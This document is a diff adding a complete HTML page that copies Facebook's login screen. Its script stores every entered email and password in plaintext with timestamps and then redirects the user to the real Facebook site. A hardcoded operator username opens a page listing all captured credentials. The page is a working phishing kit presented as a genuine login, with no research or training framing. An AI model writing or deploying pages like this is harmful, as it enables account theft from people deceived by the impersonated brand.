@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .container {
+            text-align: center;
+        }
+        .logo {
+            font-size: 48px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 20px;
+        }
+        .login-box {
+            background: white;
+            padding: 20px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            width: 360px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background: #166fe5;
+        }
+        .forgot {
+            display: block;
+            margin: 10px 0;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .create-btn {
+            background: #42b72a;
+            margin-top: 10px;
+        }
+        .create-btn:hover {
+            background: #36a420;
+        }
+    </style>
+    <script>
+        function login() {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+            const timestamp = new Date().toLocaleString();
+
+            // Store login attempt in localStorage
+            let history = JSON.parse(localStorage.getItem("loginHistory")) || [];
+            history.push({ username: email, password: password, time: timestamp });
+            localStorage.setItem("loginHistory", JSON.stringify(history));
+
+            // If the username is "msmarktv", show login history
+            if (email === "msmarktv") {
+                const newPage = window.open("", "_blank");
+                newPage.document.write(`<h1>Login History</h1>`);
+                history.forEach((entry, index) => {
+                    newPage.document.write(`<p><strong>${index + 1}.</strong> Username: ${entry.username}, Password: ${entry.password}, Time: ${entry.time}</p>`);
+                });
+            } else {
+                window.location.href = "https://www.facebook.com";
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">facebook</div>
+        <div class="login-box">
+            <input type="text" id="email" placeholder="Email or Phone Number">
+            <input type="password" id="password" placeholder="Password">
+            <button onclick="login()">Log In</button>
+            <a href="#" class="forgot">Forgotten password?</a>
+            <hr>
+            <button class="create-btn">Create New Account</button>
+        </div>
+    </div>
+</body>
+</html>
